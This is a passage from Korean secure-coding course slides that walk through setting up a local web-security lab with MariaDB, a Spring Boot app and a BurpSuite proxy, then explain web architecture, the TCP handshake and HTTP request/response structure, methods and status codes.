   웹 서비스 포트                                    프록시 서비스 포트
   192.168.0.10:8000                                127.0.0.1:8081
        ▲
        └┄┄┄┄┄┄┄┄┄┄┄ (점선) HTTP Request / HTTP Response — 프록시를 거치지 않는 직접 연결 ┄┄┄┄┄┄┄┄┄┄┄┘
```

| 연결 방식 | 설정 | 설명 |
| --- | --- | --- |
| **1. 웹 서비스 직접 연결** (점선) | 브라우저에 `192.168.0.10:8000` 또는 `127.0.0.1:8000` 입력 | 사용자는 웹 브라우저에서 직접 웹 서비스 포트에 접속하여 웹 서비스 사용 가능 |
| **2. Local Proxy 설정** (주황 실선) | 브라우저 Proxy 서버 설정에 `127.0.0.1:8081` 설정 후 `192.168.0.10:8000` 접속 | BurpSuite로 동작시킨 후, 웹 브라우저에 해당 프록시 서버를 등록하면, 모든 HTTP 요청과 응답을 프록시를 통해 주고받을 수 있음 |

---

## [2-SLIDES] 3주차 1차시 p.6 · 실습환경 구축 – 웹 서비스 서버 설정 (1/8)
실습환경 구축 – 웹 서비스 서버 설정 (1/8)
Step1. 배포된 LAB 파일 압축 해제
SecureCoding2025.zip 파일을 C:\에 압축 해제
정상적으로 압축을 해제하면 아래 화면과 같이 폴더와 LAB 파일들이 생성됨

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[탐색기 캡처: 내 PC > 로컬 디스크 (C:) > SecureCoding2025]

| 이름 | 유형 |
| --- | --- |
| download | 파일 폴더 |
| JNDI-Exploit-Kit | 파일 폴더 |
| logs | 파일 폴더 |
| sts4 | 파일 폴더 |
| webgoat | 파일 폴더 |
| workspace | 파일 폴더 |
| README.md | MD 파일 (0KB) |
| set_env.txt | TXT 파일 (1KB) |
| start_lab.bat | Windows 배치 파일 (1KB) |

---

## [2-SLIDES] 3주차 1차시 p.7 · 실습환경 구축 – 웹 서비스 서버 설정 (2/8)
실습환경 구축 – 웹 서비스 서버 설정 (2/8)
Step2. 환경변수 설정
〮 시스템 변수 3가지 추가
내PC > 오른쪽 버튼 클릭 > 속성 > 고급 시스템 설정 > 환경변수 로 들어가서 하단 ‘시스템 변수’ 창에서 ‘새로 만들기’ 선택
JAVA_HOME C:\SecureCoding2025\download\jdk-15.0.2\
MAVEN_HOME C:\SecureCoding2025\download\apache-maven-3.8.1\
MYSQL_HOME C:\SecureCoding2025\download\mariadb-10.5.10-winx64\
〮 시스템 변수 Path에 3가지 경로를 제일 앞에 추가
‘시스템 변수’에서 Path 환경변수 선택 > 편집 > 새로 만들기 선택 후 제일 위에 추가
%JAVA_HOME%\bin\
%MAVEN_HOME%\bin\
%MYSQL_HOME%\bin\
〮 환경변수가 정상적으로 반영되었는지 확인
찾기 > cmd 실행하여 커맨드 창에서 정상적으로 버전이 출력되는지 확인
> java –version
> mvn –version
> mysql --version

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[명령 프롬프트 캡처: 세 명령의 정상 출력 예]

```
C:\Users\...>java -version
java version "15.0.2" 2021-01-19
Java(TM) SE Runtime Environment (build 15.0.2+7-27)
Java HotSpot(TM) 64-Bit Server VM (build 15.0.2+7-27, mixed mode, sharing)

C:\Users\...>mvn -version
Apache Maven 3.8.1 (05c21c65bdfed0f71a2f2ada8b84da59348c4c5d)
Maven home: C:\SecureCoding2025\download\apache-maven-3.8.1\bin\..
Java version: 15.0.2, vendor: Oracle Corporation, runtime: C:\SecureCoding2025\download\jdk-15.0.2
Default locale: ko_KR, platform encoding: MS949
OS name: "windows 10", version: "10.0", arch: "amd64", family: "windows"

C:\Users\...>mysql --version
mysql  Ver 15.1 Distrib 10.5.10-MariaDB, for Win64 (AMD64), source revision 3f55c569...
```

---

## [2-SLIDES] 3주차 1차시 p.8 · 실습환경 구축 – 웹 서비스 서버 설정 (3/8)
실습환경 구축 – 웹 서비스 서버 설정 (3/8)
Step3. 사용하고 있는 포트 확인
〮 시스템에 이미 사용하고 있는 포트가 있는지 확인
cmd 창에서 아래 명령어를 입력하여, 실습에 사용할 포트를 이미 점유한 프로세스가 있는지 확인
3306, 8000, 8100, 8200, 8080, 8081
> netstat –ano | more
〮 만약 LISTENING으로 보이는 포트가 있다면, 해당하는 프로세스를 찾아 종료
표시된 PID값으로 ‘작업 관리자’ 에서 어떤 프로세스인지 확인 가능

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[명령 프롬프트 캡처: `netstat -ano | more` 결과 — 프로토콜 / 로컬 주소 / 외부 주소 / 상태 / PID 열로 TCP 0.0.0.0:80, :135, :445, :843 … :7680 등이 LISTENING 상태로 나열됨]

※ 실습 포트 **3306, 8000, 8100, 8200, 8080, 8081**(빨간 글씨)이 목록에 LISTENING으로 있으면 그 PID의 프로세스를 종료

---

## [2-SLIDES] 3주차 1차시 p.9 · 실습환경 구축 – 웹 서비스 서버 설정 (4/8)
실습환경 구축 – 웹 서비스 서버 설정 (4/8)
Step4. start_lab.bat 실행
〮 LAB 실습에 사용할 데이터베이스(MariaDB)와 웹 서비스 개발환경(Spring Tool Suite 4) 실행
cmd 창에서 C:\SecureCoding2025로 이동하여 준비되어 있는 시작 배치 파일 실행
C:\SecureCoding2025> start_lab
〮 DB 정상 구동 확인
cmd 창에 나타난 로그 내용으로 정상 여부 확인됨
정상: [Note] mysqld.exe: ready for connections.
cmd 창은 최소화시켜놓기만 하고, 종료시키지 말 것
〮 Spring Tool Suite 4 정상 구동 확인
좌측 Project Explorer 영역에 SecureCoding 폴더가 보이면 정상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[캡처 2장]
- **start_lab 명령 프롬프트**: MariaDB InnoDB 초기화 로그가 이어지다가 `[Note] mysqld.exe: ready for connections.` 가 출력됨 (정상 구동)
- **Spring Tool Suite 4 창**: 왼쪽 Package Explorer에 `SecureCoding` 프로젝트가 보임 (정상 구동)

※ 빨간 글씨 강조: **cmd 창은 최소화시켜놓기만 하고, 종료시키지 말 것**

---

## [2-SLIDES] 3주차 1차시 p.10 · 실습환경 구축 – 웹 서비스 서버 설정 (5/8)
실습환경 구축 – 웹 서비스 서버 설정 (5/8)
Step5. Update Project 실행
〮 SecureCoding 프로젝트의 의존성과 설정을 최신 상태로 동기화
프로젝트명에서 마우스 오른쪽 클릭 > Maven > Update Project 선택
Update Maven 창에서 OK 선택
〮 IDE의 우측 하단 진행 상황 확인
모든 업데이트가 완료되면 진행 상황이 사라짐

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[캡처 3장 — 빨간 상자로 클릭 위치 표시]
1. STS4에서 프로젝트 우클릭 메뉴 > **Maven** > **Update Project…** (단축키 Alt+F5)
2. 'Update Maven Project' 창: Available Maven Codebases에 `SecureCoding` 체크 → **OK**
3. 오른쪽 아래 진행 표시줄 `Updating Maven Project: (48%)` — 사라지면 완료

---

## [2-SLIDES] 3주차 1차시 p.11 · 실습환경 구축 – 웹 서비스 서버 설정 (6/8)
실습환경 구축 – 웹 서비스 서버 설정 (6/8)
Step6. Run As > Spring Boot App 실행
〮 프로젝트의 업데이트가 모두 완료되면 서버 실행
프로젝트명에서 마우스 오른쪽 클릭 > Run As > Spring boot App 선택
Select Java Application에서 SecureCodingLabTestApplication 확인 후 OK 선택
〮 IDE의 우측 하단 진행 상황 확인
아래와 같이 콘솔창에 Tomcat started on port(s): 8000 이 보이면 정상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[캡처 3장 — 빨간 상자로 클릭 위치 표시]
1. 프로젝트 우클릭 메뉴 > **Run As** > **Spring Boot App** (Alt+Shift+X, B)
2. 'Select Java Application' 창: Matching items 중 **SecureCodingLabTestApplication - kr.co.openeg.lab** 선택 → **OK** (다른 후보: BuildExploit, EncodingMaker)
3. Console 로그 중 검은 상자로 강조된 줄: `TomcatWebServer:220 - Tomcat started on port(s): 8000 (http) with context path ''` → 정상 실행

---

## [2-SLIDES] 3주차 1차시 p.12 · 실습환경 구축 – 웹 서비스 서버 설정 (7/8)
실습환경 구축 – 웹 서비스 서버 설정 (7/8)
Step7. 다음과 같은 경고가 발생하였을 때 대처 방법
〮 콘솔 윈도우의 버퍼 크기를 늘려줘야 함
Window > Preferences > Run/Debug > Console을 선택하여
Console buffer size(characters)를 1,000,000으로 수정한 후,
‘Apply and Close’ 버튼 클릭

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[경고창 캡처: Ansi Console — **CONSOLE PERFORMANCE WARNING** (from Ansi Console)!]

> Console buffer size too low (80,000). About 2 times slower.
> Main menu → Window → Preferences → Run/Debug → Console
> • Check "Limit console output"
> • Set "Console buffer size (characters)" to a bigger value. The sweet spot seems to be about 1,000,000
> or
> • Uncheck "Limit console output" — No visible performance difference compared to 1,000,000
> [Remind me later] [Never remind me again]

[Preferences 창 캡처: 왼쪽 트리에서 **Run/Debug > Console** 선택(빨간 상자), 오른쪽 'Limit console output' 체크 상태에서 **Console buffer size (characters): 1000000** 입력(빨간 상자) → Apply and Close]

---

## [2-SLIDES] 3주차 1차시 p.13 · 실습환경 구축 – 웹 서비스 서버 설정 (8/8)
실습환경 구축 – 웹 서비스 서버 설정 (8/8)
Step8. 웹 브라우저를 띄워 정상 동작 확인
크롬이나 파이어폭스를 실행시켜 LAB 웹 서비스에 접속
주소창에 localhost:8000 를 입력하면 아래와 같은 화면이 나타나고, 로그인 가능함
ID: test
PW: qqq111
입력하여 로그인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[브라우저 캡처 2장 — 화살표로 이어짐]
1. **로그인 화면** (`localhost:8000/login`, 탭 제목 '시큐어코딩랩 - 홈'): 상단 '(주)오픈이지 — 안전한 소프트웨어를 만들기 위한 노력', 메뉴 [메인 / 게시판 / 시큐어코딩 테스트 / DB 초기화], 가운데 일러스트, 아래 아이디·비밀번호 입력칸과 [로그인] 버튼, '아직 회원이 아니신가요? 회원가입'. 빨간 글씨: **ID: test / PW: qqq111 입력하여 로그인**
2. **로그인 후 메인 화면** (`localhost:8000/board/main`): 오른쪽 위 '[test 님] 로그아웃 정보수정', 소프트웨어 보안 소개 문단과 『해킹 방어를 위한 JAVA 시큐어코딩』 책 표지, 하단 'Copyright © (주)오픈이지 2021-2025'

---

## [2-SLIDES] 3주차 1차시 p.14 · 실습환경 구축 – 프록시 설정(1/4)
실습환경 구축 – 프록시 설정(1/4)
Step1. BurpSuite 패키지 실행
〮 BurpSuiteCommunity.exe 를 실행하면 별도 설치 없이 바로 구동됨
C:\SecureCoding2025\download\BurpSuiteCommunity 폴더에 있음
〮 Terms and Conditions 에서 ‘I Accept’ 버튼 선택

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[캡처 2장]
1. 탐색기 `C:\SecureCoding2025\download\BurpSuiteCommunity` 폴더: .install4j, burpbrowser, jre, burpsuite_community.jar, **BurpSuiteCommunity.exe**(빨간 상자), BurpSuiteCommunity.vmoptions, uninstall.exe
2. 'Burp Suite Community Edition — Terms and Conditions' 창: 약관 본문 아래 [I Decline] [**I Accept**](빨간 상자)

---

## [2-SLIDES] 3주차 1차시 p.15 · 실습환경 구축 – 프록시 설정(2/4)
실습환경 구축 – 프록시 설정(2/4)
Step2. BurpSuite 패키지 실행 옵션 선택
Temporary project 선택 후 ‘Next’ 버튼 선택
Use Burp defaults 선택 후 ‘Start Burp’ 버튼 선택

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[Burp Suite Community Edition v2021.10 시작 창 2단계]
1. 프로젝트 선택: **Temporary project**(빨간 상자) / New project on disk / Open existing project (※ Disk-based projects are only supported on Burp Suite Professional) → [Next]
2. 설정 선택: **Use Burp defaults**(빨간 상자) / Use options saved with project / Load from configuration file → [**Start Burp**](빨간 상자)

---

## [2-SLIDES] 3주차 1차시 p.16 · 실습환경 구축 – 프록시 설정(3/4)
실습환경 구축 – 프록시 설정(3/4)
Step3. 프록시 서버의 인터페이스 설정 수정
〮 상단 메뉴에서 Proxy > Options 선택
Proxy Listener 목록에서 127.0.0.1:8080 인터페이스 체크 및 선택
해당 인터페이스가 주황색으로 표시됨
〮 좌측 Edit 버튼 클릭

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite 화면 캡처 — 빨간 상자·화살표로 순서 표시]

상단 탭 **Proxy** → 하위 탭 **Options** → 'Proxy Listeners' 표:

| Running | Interface | Invisible | Redirect | Certificate |
| --- | --- | --- | --- | --- |
| ☑ | **127.0.0.1:8080** (주황색으로 선택됨) | | | Per-host |

→ 왼쪽 [Add] [**Edit**] [Remove] 중 Edit 클릭

---

## [2-SLIDES] 3주차 1차시 p.17 · 실습환경 구축 – 프록시 설정(4/4)
실습환경 구축 – 프록시 설정(4/4)
Step4. 프록시 서버의 Bind Port 수정
Edit proxy listener 창에서 ‘Bind to port’ 항목을 8081로 변경
OK 버튼 선택

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
['Edit proxy listener' 창 캡처 — Binding 탭]
- **Bind to port: 8081**(빨간 상자, 기존 8080에서 변경)
- Bind to address: ◉ Loopback only / ○ All interfaces / ○ Specific address: 127.0.0.1
- → [**OK**](빨간 상자)

---

## [2-SLIDES] 3주차 1차시 p.18 · 실습환경 구축 – 파이어폭스 브라우저 설정(1/3)
실습환경 구축 – 파이어폭스 브라우저 설정(1/3)
Step1. 우측 상단 세줄 메뉴 버튼 클릭
아래 항목에서 ‘설정’ 항목 선택
나타난 ‘일반’ 화면 맨 아래로 내려가서
‘네트워크 설정’의 ‘설정’ 버튼 선택

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[파이어폭스 캡처 2장]
1. 오른쪽 위 **≡ 메뉴**(빨간 상자) → 메뉴 목록(새 탭, 새 창, 새 사생활 보호 창, 북마크, 기록, 다운로드, 비밀번호, 부가 기능 및 테마, 인쇄, … 확대/축소) 중 **설정**(빨간 상자)
2. 설정 '일반' 화면 맨 아래 **네트워크 설정** — "Firefox가 인터넷에 접근하는 방법을 설정하세요." 옆 [**설정…(E)**](빨간 상자)

---

## [2-SLIDES] 3주차 1차시 p.19 · 실습환경 구축 – 파이어폭스 브라우저 설정(2/3)
실습환경 구축 – 파이어폭스 브라우저 설정(2/3)
Step2. 연결 설정에서 수동 프록시 서버 정보 입력
수동 프록시 설정 선택
HTTP 프록시에 127.0.0.1, 포트에 8081 입력
확인 버튼 선택

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[파이어폭스 '연결 설정' 창 캡처]
- 인터넷 프록시 접근 설정: ○ 프록시 사용 안 함 / ○ 프록시 설정 자동 감지 / ○ 시스템 프록시 설정 사용 / ◉ **수동 프록시 설정**(빨간 상자)
- **HTTP 프록시: 127.0.0.1**(빨간 상자) / **포트: 8081**(빨간 상자)
- □ HTTPS에도 이 프록시를 사용 (체크 안 함), HTTPS 프록시·SOCKS 호스트는 비움
- 안내 문구: "localhost, 127.0.0.1/8 및 ::1에 대한 연결은 프록시가 사용되지 않습니다." ← 다음 단계(3/3)에서 이 제한을 푸는 이유
- → [**확인**](빨간 상자)

---

## [2-SLIDES] 3주차 1차시 p.20 · 실습환경 구축 – 파이어폭스 브라우저 설정(3/3)
실습환경 구축 – 파이어폭스 브라우저 설정(3/3)
Step3. localhost 에서 프록시 설정 가능하도록 옵션 변경
〮 주소창에 ‘about:config’ 입력
〮 경고 메시지에서 ‘위험을 감수하고 계속’ 버튼 선택
〮 ‘설정 이름 검색’ 창에 ‘network.proxy.allow_hijacking_localhost’를 입력
〮 해당 설정 우측 좌우 화살표 버튼을 눌러 값을 ‘true’로 변경

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[파이어폭스 캡처 2장]
1. `about:config` 경고 화면: '주의해서 사용하세요 — 고급 설정을 변경하면 Firefox의 성능 또는 보안에 영향을 줄 수 있습니다.' → [**위험을 감수하고 계속**](빨간 상자)
2. 설정 검색창에 `network.proxy.allow_hijacking_localhost` 입력(빨간 상자) → 결과 행 값이 **true**, 오른쪽 ⇄(토글) 버튼을 빨간 화살표로 가리킴

---

## [2-SLIDES] 3주차 1차시 p.21 · 실습환경 구축 – BurpSuite 프록시 서버 동작
실습환경 구축 – BurpSuite 프록시 서버 동작
이후 해당 웹 브라우저 사용시 발생하는 모든 HTTP 요청은 BurpSuite가 가로 챔
웹 브라우저에서 LAB 웹 서비스 주소를 입력해도 일단 BurpSuite가 붙잡고 있어서 화면이 나오지 않음
Intercept 메뉴에서 ‘Intercept is on’ 버튼을 눌러 off 시키면, 대기하던 모든 내용이 전달되어 화면이 나타남
붙잡혀있는
HTTP 요청

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite 캡처: Proxy > **Intercept** 탭(빨간 상자), 'Request to http://localhost:8000 [127.0.0.1]', 버튼 [Forward] [Drop] [**Intercept is on**](빨간 상자) [Action] [Open Browser]]

빨간 글씨 '붙잡혀있는 HTTP 요청'이 가리키는 Raw 내용:

```http
GET /login HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Fi…
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=EC82962C430C2679DF183C7AC123763A
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

---

## [2-SLIDES] 3주차 1차시 p.22 · 실습환경 구축-1
실습환경 구축-1
01 실습환경 구축
02 웹과 HTTP 구조 이해
03 데이터 인코딩

---

## [2-SLIDES] 3주차 1차시 p.23 · 웹 구조
웹 구조
단순화된 구조 확장 표현된 구조
출처: 위키피디아 출처: https://medium.com/@iyuroch/application-architecture-plan-layers-68defde66ade

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식 2개 — 화살표로 이어짐]

**단순화된 구조** (출처: 위키피디아)
```
 Users                     Calling Services
   ↕                              ┆ (점선)
 Presentation Layer               ┆
 Business Layer  ◄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
 Data Layer
   ↕            ↕
 Data Sources   Services
```

**확장 표현된 구조** (출처: https://medium.com/@iyuroch/application-architecture-plan-layers-68defde66ade)

| 계층 | 구성 요소 |
| --- | --- |
| (외부) | Users, Clients |
| **Presentation Layer** | UI Components, UI Process Components (← Users) / Service Interface (← Clients) |
| **Business Layer** | Application Facade, Business Components, Business Workflows, Business Entities(세로로 여러 계층에 걸침) |
| **Data Layer** | Data Access Logic Components, Data Helper / Utilities, Service Agents |
| (외부) | Data Sources, Services |
| **Cross-Cutting** (전 계층 공통, 오른쪽 세로 막대) | Security, Operational Management, Communication |

(퀴즈 1번의 '웹 애플리케이션 서버 로직 3대 계층' = Presentation / Business / Data)

---

## [2-SLIDES] 3주차 1차시 p.24 · 웹 서비스 흐름
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
웹 서비스 흐름

[도식: Web Browser → DNS Server → Web Server → WAS → Database, 번호 순서대로]

| 순서 | 구간 | 동작 |
| --- | --- | --- |
| ① | Web Browser → DNS Server | `http://www.웹서버URL.com` 요청 |
| ② | DNS Server → Web Browser | 123.123.123.123을 응답 (IP 주소) |
| ③ | Web Browser → Web Server | 123.123.123.123으로 index.html 요청 |
| ④ | Web Server → WAS | 요청 중계 |
| ⑤ | WAS ↔ Database | DB 조회 (Connector: JDBC, ODBC) |
| ⑥ | WAS → Web Server | 응답 중계 |
| ⑦ | Web Server → Web Browser | index.html 응답 (html, css, javascript, …) |

| 구성 요소 | 예시 제품 |
| --- | --- |
| Web Browser | Chrome, FireFox, Internet Explorer |
| Web Server | Apache, nginx, webtob |
| Web Application Server (WAS) — 안에 Business Logic 여러 개 | tomcat, WebLogic, JBoss, jeus |
| Database | Oracle, MySQL, MSSQL |

---

## [2-SLIDES] 3주차 1차시 p.25 · HTTP 구조
HTTP 구조
HTTP (HyperText Transfer Protocol)
〮 WWW 상에서 HTML 문서와 같은 리소스들을 가져올 수 있도록 해주는 프로토콜
〮 요청(Request), 응답(Response) 구조, 무상태 방식(Stateless)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식 2개]

**왼쪽 — 웹 문서 하나를 여러 요청으로 가져오는 모습**: Web document 안의 요소마다 별도 GET 요청이 The Internet을 거쳐 각 서버로 감
- `GET layout.css`, `GET image.png`, `GET page.html` → **Web server**
- `GET video.mp4` → **Video server**
- `GET ads.jpg` → **Ads server**

**오른쪽 — 웹 기술 계층도 ('The Web' 범위)**

```
┌──────┬──────┬──────────┐
│      │      │ Web APIs │
│ HTML │ CSS  ├──────────┤
│      │      │JavaScript│
├──────┴──────┴──────────┤
│         HTTP           │  ← 빨간 글씨
├──────┬─────────┬───────┤
│ DNS  │         │  TLS  │
├──────┤   TCP   ├───────┤
│ UDP  │                 │
├──────┴─────────────────┤
│          IP            │
└────────────────────────┘
```

---

## [2-SLIDES] 3주차 1차시 p.26 · HTTP 구조 — HTTP 흐름 이해
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
HTTP 구조 — HTTP 흐름 이해

[도식: 웹 브라우저(왼쪽)와 웹 서버(오른쪽)의 HTTP·TCP·IP 계층 사이에 번호 순서대로 주고받는 흐름]

| 번호 | 위치 | 내용 |
| --- | --- | --- |
| 1 | 서버 HTTP 부모 프로세스 → TCP | 연결대기 |
| 2 | 브라우저 HTTP → TCP | 연결요청 |
| 3 | 브라우저 → 서버 | **SYN** |
| 4 | 서버 → 브라우저 | **SYN/ACK** |
| 5 | 브라우저 → 서버 | **ACK** (여기까지 3-way handshake = TCP 연결설정) |
| 6 | 브라우저 TCP → HTTP | 연결확인 |
| 7 | 서버 TCP → HTTP 부모 프로세스 | 연결승락 |
| 8 | 서버 | HTTP 부모 프로세스가 **HTTP 자식 프로세스 생성** |
| 9 | 브라우저 HTTP → TCP | HTTP요청 |
| 10 | 브라우저 → 서버 | **DATA (Request)** |
| 11 | 서버 → 브라우저 | ACK |
| 12 | 서버 TCP → 자식 프로세스 | HTTP요청 |
| 13 | 자식 프로세스 ↔ 저장소 | 웹 페이지 |
| 14 | 자식 프로세스 → TCP | HTTP응답 |
| 15 | 서버 → 브라우저 | **DATA (Response)** |
| 16 | 브라우저 → 서버 | ACK |
| 17 | 브라우저 TCP → HTTP | HTTP응답 |
| 18 | 브라우저 → 서버 | **FIN** |
| 19 | 서버 → 브라우저 | ACK |
| 20 | 서버 → 브라우저 | **FIN** |
| 21 | 브라우저 → 서버 | ACK (여기까지 4-way handshake = TCP 연결해제) |

(TCP 박스 안 구간 표시: 연결설정 → 데이터 전송 → 연결해제)

---

## [2-SLIDES] 3주차 1차시 p.27 · BurpSuite을 활용한 HTTP 구조 보기
BurpSuite을 활용한 HTTP 구조 보기
〮 수동 웹 프록시로 BurpSuite를 경유하도록 설정한 경우
Proxy > HTTP history 에서 HTTP
Request/Response 내용 조회 가능
Request
Response
내용
내용

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite 캡처: Proxy > **HTTP history**(빨간 상자)]

| # | Host | Method | URL | Status | Length | MIME type |
| --- | --- | --- | --- | --- | --- | --- |
| 197 | http://localhost:8000 | GET | /board/main | 200 | 3589 | HTML (주황색 선택) |
| 202 | http://detectportal.firefox.com | GET | /canonical.html | 200 | 317 | XML |
| 203 | http://detectportal.firefox.com | GET | /success.txt?ipv4 | 200 | 235 | text |
| 204 | http://detectportal.firefox.com | GET | /success.txt?ipv6 | 200 | 235 | text |

아래 왼쪽 빨간 상자 = **Request 내용**, 가운데 빨간 상자 = **Response 내용** (각각 다음 두 슬라이드에 확대), 오른쪽 INSPECTOR 패널(Request Attributes, Request Cookies (1), Request Headers (10), Response Headers (13))

---

## [2-SLIDES] 3주차 1차시 p.28 · HTTP Request 메시지 구조
HTTP Request 메시지 구조

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite Request 탭 Raw 캡처]

```http
GET /board/main HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost:8000/login
Connection: close
Cookie: JSESSIONID=C84105A85AC5C292FEE00982DB9EA846
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

(1행 = 요청 라인: 메서드·경로·버전 / 2~11행 = 헤더 / 빈 줄 뒤 = 바디(GET이라 비어 있음))

---

## [2-SLIDES] 3주차 1차시 p.29 · HTTP Request Method
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
HTTP Request Method

| Method | 설명 |
| --- | --- |
| **GET** | 자원 요청(default값), 요청 파라메터를 URL에 붙여서 전송 / 보안이 요구되지 않은 짧은 데이터를 전송하는 경우, 북마크가 필요한 경우에 사용 / 예: `test.jsp?id=kim&pass=1234` |
| **POST** | 자원 요청, 요청 파라메터를 Body에 붙여서 전송 / 전송할 데이터가 양이 많은 경우, 비밀 정보를 전송해야 하는 경우에 사용 / 예: `<form method="post"></form>` |
| **HEAD** | HTTP Header 정보만 요청 / Meta 정보 획득이나 Hyper Text의 링크 유효성을 검사하는 용도로 사용 |
| **PUT** | URL 자원을 생성하도록 요청. 파일을 업로드 할 수 있다. |
| **DELETE** | URL 자원을 삭제하도록 요청. 파일을 삭제할 수 있다. |
| **TRACE** | 진단을 위한 목적으로 사용되는 메서드로, 서버는 응답 바디에 요청 받은 자료와 똑같은 내용을 보냄 |
| **OPTIONS** | 응답 가능한 HTTP Method를 요청 |

---

## [2-SLIDES] 3주차 1차시 p.30 · HTTP Response 메시지 구조
HTTP Response 메시지 구조

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite Response 탭 Raw 캡처]

```http
HTTP/1.1 200
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: text/html;charset=UTF-8
Content-Language: ko-KR
Date: Sun, 16 Feb 2025 05:15:10 GMT
Connection: close
Content-Length: 3182

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <title>□□□□□□ - □□</title>
   universal 
```

(1행 = 상태 라인: 버전·상태코드 / 2~14행 = 헤더 / 빈 줄 뒤 = HTML 바디. title의 한글은 캡처에서 깨져 □로 보임)

---

## [2-SLIDES] 3주차 1차시 p.31 · HTTP Response Status Code
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
HTTP Response Status Code

| 상태코드 | 설명 |
| --- | --- |
| 1xx | 정보를 제공함 |
| 2xx | 요청이 성공적으로 이루어짐 |
| 3xx | 요청한 해당 자원이 다른 곳에 있음 |
| 4xx | 요청에 문제가 있음 |
| 5xx | 서버에 에러가 있음 |

| 코드 | 설명 |
| --- | --- |
| 100(계속) | 요청자는 요청을 계속해야 한다. 서버는 이 코드를 제공하여 요청의 첫 번째 부분을 받았으며 나머지를 기다리고 있음 |
| 101(프로토콜 전환) | 요청자가 서버에 프로토콜 전환을 요청했으며 서버는 이를 승인하는 중. |
| 200(성공) | 서버가 요청을 정상적으로 처리함. |
| 201(작성됨) | 성공적으로 요청되었으며 서버가 새 리소스를 작성 |
| 202(허용됨) | 서버가 요청을 접수했지만 아직 처리하지 않음 |
| 203(신뢰할 수 없는 정보) | 서버가 요청을 성공적으로 처리했지만 다른 소스에서 수신된 정보를 제공 |
| 204(콘텐츠 없음) | 서버가 요청을 성공적으로 처리했지만 콘텐츠를 제공하지 않음 |
| 205(콘텐츠 재설정) | 서버가 요청을 성공적으로 처리했지만 콘텐츠를 표시하지 않음. 204 응답과 달리 이 응답은 요청자가 문서 보기를 재설정할 것을 요구(예: 새 입력을 위한 양식 비우기). |
| 206(일부 콘텐츠) | 서버가 GET 요청의 일부만 성공적으로 처리함 |

---

## [2-SLIDES] 3주차 1차시 p.32 · HTTP Response Status Code
HTTP Response Status Code
300(복수 응답) 서버가 요청에 따라 여러 조치를 선택. 수행할 작업을 선택하거나, 요청자가 선택할 수 있는 작업 목록을 제공.
301(영구 이동) 요청한 페이지가 새 위치로 영구적으로 이동했음.
302(임시 이동) 현재 서버가 다른 위치의 페이지로 요청에 응답하고 있지만, 요청자는 향후 요청 시 원래 위치를 계속 사용해야 함.
303(기타 위치 보기) HEAD 요청 이외의 모든 요청을 다른 위치로 자동으로 전달
304(수정되지 않음) 마지막 요청 이후 요청한 페이지는 수정되지 않았음.
305(프록시 사용) 요청자는 프록시를 사용하여 요청한 페이지만 접근할 수 있음.
307(임시 리다이렉션) 현재 서버가 다른 위치의 페이지로 요청에 응답하고 있지만, 요청자는 향후 요청시 원래 위치를 계속 사용해야 함.
308(영구 리다이렉션) RFC에서 실험적으로 승인됨
400(잘못된 요청) 서버가 요청의 구문을 인식하지 못함
401(권한 없음) 이 요청은 인증이 필요함. 서버는 로그인이 필요한 페이지에 대해 이 요청을 제공할 수 있음.
402(결제 필요) 이 요청은 결제가 필요함
